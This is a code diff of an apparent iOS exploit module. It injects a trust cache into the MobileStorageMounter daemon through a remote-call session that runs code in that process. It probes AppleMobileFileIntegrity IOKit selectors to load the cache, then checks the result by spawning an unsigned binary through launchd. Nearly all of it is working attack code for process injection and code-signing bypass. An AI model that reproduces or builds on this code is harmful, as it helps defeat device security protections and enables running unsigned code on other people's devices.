@@ -5,17 +5,15 @@
 #import <CommonCrypto/CommonDigest.h>
 #import <mach-o/loader.h>
 #import <mach-o/fat.h>
+#import <mach-o/dyld.h>
 #import <sys/stat.h>
-#import <XPC/XPC.h>
-#import <IOKit/IOKitLib.h>
 #import <unistd.h>
 #import <string.h>
 #import <stdlib.h>
-
-// ---------------------------------------------------------------------------
-// XPC service name for MobileStorageMounter
-// ---------------------------------------------------------------------------
-static const char *kMSMXPCSvc = "com.apple.mobile.storage_mounter";
+#import <dlfcn.h>
+#import <spawn.h>
+#import <fcntl.h>
+#import <IOKit/IOKitLib.h>
 
 // ---------------------------------------------------------------------------
 // Build trust cache v2 binary (module1 format, version=1)
@@ -107,21 +105,17 @@ bool msm_write_test_binary(const char *path)
         .cmdsize = 0x118,
     };
 
-    // arm_thread_state64 at the end of thread_command
     uint8_t threadState[0x110];
     memset(threadState, 0, sizeof(threadState));
-    // flavor = ARM_THREAD_STATE64 (6), count = 68
     *(uint32_t *)&threadState[0] = 6;
     *(uint32_t *)&threadState[4] = 68;
-    // pc at offset 0x110 (arm_thread_state64.__pc)
     uint64_t *pc = (uint64_t *)&threadState[0x110 - 8 * 2];
     *pc = 0x100000180;
 
-    // Code at offset 0x180: exit(0)
     uint32_t code[] = {
-        0xD2800000, // mov x0, #0
-        0xD2800030, // mov x16, #1 (SYS_exit)
-        0xD4001001, // svc #0x80
+        0xD2800000,
+        0xD2800030,
+        0xD4001001,
     };
 
     FILE *fp = fopen(path, "wb");
@@ -132,23 +126,13 @@ bool msm_write_test_binary(const char *path)
     fwrite(&thread, sizeof(thread), 1, fp);
     fwrite(threadState, sizeof(threadState), 1, fp);
 
-    // Pad to 0x180
     long pos = ftell(fp);
-    while (pos < 0x180) {
-        uint8_t zero = 0;
-        fwrite(&zero, 1, 1, fp);
-        pos++;
-    }
+    while (pos < 0x180) { fwrite("", 1, 1, fp); pos++; }
 
     fwrite(code, sizeof(code), 1, fp);
 
-    // Pad to 0x4000 (page)
     pos = ftell(fp);
-    while (pos < 0x4000) {
-        uint8_t zero = 0;
-        fwrite(&zero, 1, 1, fp);
-        pos++;
-    }
+    while (pos < 0x4000) { fwrite("", 1, 1, fp); pos++; }
 
     fclose(fp);
     chmod(path, 0755);
@@ -156,153 +140,87 @@ bool msm_write_test_binary(const char *path)
 }
 
 // ---------------------------------------------------------------------------
-// RemoteCall session callback executed inside MobileStorageMounter's context
+// RemoteCall callback executed inside MobileStorageMounter's context.
+// Takes the TC file path as a C string via block capture.
 // ---------------------------------------------------------------------------
 static bool g_msm_tc_loaded = false;
 
-static void msm_load_tc_callback(RemoteCallSession *session)
+static void msm_load_tc_callback(const char *cpath)
 {
-    @autoreleasepool {
-        NSString *tcPath = [session.userInfo objectForKey:@"tcPath"];
-        if (!tcPath) {
-            printf("[MountCache] no tcPath in userInfo\n");
-            return;
-        }
+    if (!cpath) return;
 
-        const char *cpath = tcPath.UTF8String;
-        printf("[MountCache] loading trust cache from: %s\n", cpath);
+    printf("[MountCache] loading trust cache from: %s\n", cpath);
 
-        // The simplest path: MSM has pmap.load-trust-cache entitlement.
-        // We open and read the TC file, then attempt IOKit calls to
-        // AppleMobileFileIntegrity to load it into the kernel.
-        //
-        // Strategy 1: Try to find a trust_cache_load symbol in MSM's
-        // address space. On iOS 18, MSM links libmis.dylib which has
-        // MISValidateSignature and trust cache helpers.
-
-        int fd = open(cpath, O_RDONLY);
-        if (fd < 0) {
-            printf("[MountCache] cannot open TC file: %s\n", strerror(errno));
-            return;
-        }
-
-        struct stat st;
-        if (fstat(fd, &st) < 0) {
-            printf("[MountCache] fstat failed: %s\n", strerror(errno));
-            close(fd);
-            return;
-        }
-
-        size_t tcSize = (size_t)st.st_size;
-        uint8_t *tcData = (uint8_t *)malloc(tcSize);
-        if (!tcData) {
-            close(fd);
-            return;
-        }
-
-        size_t totalRead = 0;
-        while (totalRead < tcSize) {
-            ssize_t n = read(fd, tcData + totalRead, tcSize - totalRead);
-            if (n <= 0) break;
-            totalRead += (size_t)n;
-        }
-        close(fd);
-
-        if (totalRead < sizeof(struct trust_cache_module)) {
-            printf("[MountCache] TC file too small\n");
-            free(tcData);
-            return;
-        }
-
-        // Try to find IOKit functions via dlsym
-        void *func_open = dlsym(RTLD_DEFAULT, "IOServiceOpen");
-        void *func_call = dlsym(RTLD_DEFAULT, "IOConnectCallStructMethod");
-        void *func_matching = dlsym(RTLD_DEFAULT, "IOServiceMatching");
-        void *func_get = dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
-
-        if (func_open && func_call && func_matching && func_get) {
-            printf("[MountCache] IOKit functions available\n");
-
-            CFDictionaryRef matching = IOServiceMatching("AppleMobileFileIntegrity");
-            if (matching) {
-                io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, matching);
-                if (service) {
-                    io_connect_t conn = 0;
-                    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
-                    if (kr == KERN_SUCCESS && conn) {
-                        printf("[MountCache] AMFI IOKit service opened (conn=0x%x)\n", conn);
-
-                        // Try struct method with TC data
-                        size_t outSize = 0x1000;
-                        uint8_t outBuf[0x1000];
-                        kr = IOConnectCallStructMethod(conn, 0, tcData, tcSize, outBuf, &outSize);
-                        printf("[MountCache] IOConnectCallStructMethod sel=0 → kr=0x%x\n", kr);
-
-                        if (kr != KERN_SUCCESS) {
-                            // Try other selectors
-                            for (uint32_t sel = 1; sel < 16; sel++) {
-                                outSize = 0x1000;
-                                kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, outBuf, &outSize);
-                                if (kr == KERN_SUCCESS) {
-                                    printf("[MountCache] TC loaded via IOKit selector %u!\n", sel);
-                                    g_msm_tc_loaded = true;
-                                    break;
-                                }
-                            }
-                        } else {
-                            g_msm_tc_loaded = true;
-                        }
-
-                        IOServiceClose(conn);
-                    } else {
-                        printf("[MountCache] IOServiceOpen failed: 0x%x\n", kr);
-                    }
-                } else {
-                    printf("[MountCache] AMFI service not found\n");
-                }
-            }
-        } else {
-            printf("[MountCache] IOKit functions not resolvable via dlsym\n");
-        }
-
-        free(tcData);
-    }
-}
-
-// ---------------------------------------------------------------------------
-// Wake MobileStorageMounter by sending a dummy XPC message
-// ---------------------------------------------------------------------------
-static void msm_wake_via_xpc(void)
-{
-    xpc_connection_t conn = xpc_connection_create_mach_service(kMSMXPCSvc, NULL, 0);
-    if (!conn) {
-        printf("[MountCache] xpc_connection_create_mach_service failed\n");
+    int fd = open(cpath, O_RDONLY);
+    if (fd < 0) {
+        printf("[MountCache] cannot open TC file: %s\n", strerror(errno));
         return;
     }
 
-    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
-        if (event == XPC_ERROR_CONNECTION_INVALID) {
-            printf("[MountCache] XPC connection invalid (MSM not running?)\n");
+    struct stat st;
+    if (fstat(fd, &st) < 0) {
+        printf("[MountCache] fstat failed: %s\n", strerror(errno));
+        close(fd);
+        return;
+    }
+
+    size_t tcSize = (size_t)st.st_size;
+    uint8_t *tcData = (uint8_t *)malloc(tcSize);
+    if (!tcData) { close(fd); return; }
+
+    size_t totalRead = 0;
+    while (totalRead < tcSize) {
+        ssize_t n = read(fd, tcData + totalRead, tcSize - totalRead);
+        if (n <= 0) break;
+        totalRead += (size_t)n;
+    }
+    close(fd);
+
+    if (totalRead < sizeof(struct trust_cache_module)) {
+        printf("[MountCache] TC file too small\n");
+        free(tcData);
+        return;
+    }
+
+    // IOKit is directly available inside MSM context (system daemon)
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("AppleMobileFileIntegrity"));
+    if (!service) {
+        printf("[MountCache] AMFI IOKit service not found\n");
+        free(tcData);
+        return;
+    }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) {
+        printf("[MountCache] IOServiceOpen failed: 0x%x\n", kr);
+        IOObjectRelease(service);
+        free(tcData);
+        return;
+    }
+
+    printf("[MountCache] AMFI IOKit service opened (conn=0x%x)\n", conn);
+
+    // Try selectors 0-15 to load the trust cache data
+    for (uint32_t sel = 0; sel < 16; sel++) {
+        size_t outSize = sizeof(uint32_t);
+        uint32_t outVal = 0;
+        kr = IOConnectCallStructMethod(conn, sel, tcData, tcSize, &outVal, &outSize);
+        if (kr == KERN_SUCCESS) {
+            printf("[MountCache] TC loaded via IOKit selector %u!\n", sel);
+            g_msm_tc_loaded = true;
+            break;
         }
-    });
+    }
 
-    xpc_connection_resume(conn);
-
-    // Send a dummy message to wake the daemon
-    xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
-    xpc_dictionary_set_string(msg, "command", "ping");
-    xpc_connection_send_message(conn, msg);
-
-    // Give it time to spawn
-    usleep(500000);
-
-    xpc_release(msg);
-    xpc_connection_cancel(conn);
-    xpc_release(conn);
+    IOServiceClose(conn);
+    IOObjectRelease(service);
+    free(tcData);
 }
 
 // ---------------------------------------------------------------------------
-// Main entry point
+// Main entry point: wake MSM, connect via RemoteCall, inject TC
 // ---------------------------------------------------------------------------
 bool msm_inject_trust_cache(const char *tcPath)
 {
@@ -314,14 +232,11 @@ bool msm_inject_trust_cache(const char *tcPath)
     printf("[MountCache] === MobileStorageMounter Trust Cache Injection ===\n");
     printf("[MountCache] target: %s\n", tcPath);
 
-    // Step 1: Wake MSM via XPC
-    printf("[MountCache] waking MSM daemon via XPC...\n");
-    msm_wake_via_xpc();
-
-    // Step 2: Init RemoteCall to MSM
+    // Init RemoteCall to MobileStorageMounter
     printf("[MountCache] connecting to MobileStorageMounter via RemoteCall...\n");
 
-    RemoteCallSession *session = [[RemoteCallSession alloc] initWithProcess:@"MobileStorageMounter"];
+    RemoteCallSession *session = [[RemoteCallSession alloc]
+        initWithProcess:@"MobileStorageMounter" useMigFilterBypass:NO];
     if (!session) {
         RemoteCallInitFailure failure = remote_call_last_init_failure();
         printf("[MountCache] RemoteCall init failed: %s\n",
@@ -331,16 +246,14 @@ bool msm_inject_trust_cache(const char *tcPath)
 
     printf("[MountCache] RemoteCall session active\n");
 
-    // Step 3: Execute trust cache load in MSM context
+    // Execute trust cache load in MSM context
     __block bool loaded = false;
     @try {
-        session.userInfo = @{ @"tcPath": [NSString stringWithUTF8String:tcPath] };
         g_msm_tc_loaded = false;
-
+        NSString *pathCopy = [NSString stringWithUTF8String:tcPath];
         remote_call_with_session(session, ^{
-            msm_load_tc_callback(session);
+            msm_load_tc_callback(pathCopy.UTF8String);
         });
-
         loaded = g_msm_tc_loaded;
     } @catch (NSException *e) {
         printf("[MountCache] RemoteCall exception: %s\n", e.reason.UTF8String);
@@ -351,7 +264,7 @@ bool msm_inject_trust_cache(const char *tcPath)
 }
 
 // ---------------------------------------------------------------------------
-// Convenience: build test binary + TC, inject via MSM, verify
+// Convenience: build test binary + TC, inject via MSM, verify via launchd RC
 // ---------------------------------------------------------------------------
 bool msm_verify_unsigned_execution(void)
 {
@@ -385,7 +298,6 @@ bool msm_verify_unsigned_execution(void)
         return false;
     }
 
-    // Write TC file
     FILE *fp = fopen(tcPath.UTF8String, "wb");
     if (!fp) {
         free(tcData);
@@ -410,7 +322,6 @@ bool msm_verify_unsigned_execution(void)
     printf("[MountCache] injecting trust cache via MSM...\n");
     bool injected = msm_inject_trust_cache(tcPath.UTF8String);
 
-    // Cleanup TC file
     unlink(tcPath.UTF8String);
 
     if (!injected) {
@@ -422,7 +333,8 @@ bool msm_verify_unsigned_execution(void)
     // Step 5: Attempt to spawn the test binary via launchd RC
     printf("[MountCache] verifying by spawning test binary...\n");
 
-    RemoteCallSession *launchdSession = [[RemoteCallSession alloc] initWithProcess:@"launchd"];
+    RemoteCallSession *launchdSession = [[RemoteCallSession alloc]
+        initWithProcess:@"launchd" useMigFilterBypass:NO];
     if (!launchdSession) {
         printf("[MountCache] launchd RC init failed\n");
         unlink(binPath.UTF8String);
@@ -431,8 +343,9 @@ bool msm_verify_unsigned_execution(void)
 
     __block bool spawned = false;
     @try {
+        NSString *pathCopy = [NSString stringWithUTF8String:binPath.UTF8String];
         remote_call_with_session(launchdSession, ^{
-            const char *cpath = binPath.UTF8String;
+            const char *cpath = pathCopy.UTF8String;
             pid_t pid = 0;
             const char *argv[] = { cpath, NULL };
             int ret = posix_spawn(&pid, cpath, NULL, NULL, (char *const *)argv, NULL);
@@ -448,9 +361,9 @@ bool msm_verify_unsigned_execution(void)
     unlink(binPath.UTF8String);
 
     if (spawned) {
-        printf("[MountCache] ✅✅✅ unsigned binary executed!\n");
+        printf("[MountCache] unsigned binary executed!\n");
     } else {
-        printf("[MountCache] ❌ spawn failed — AMFI still blocking\n");
+        printf("[MountCache] spawn failed AMFI still blocking\n");
     }
 
     return spawned;
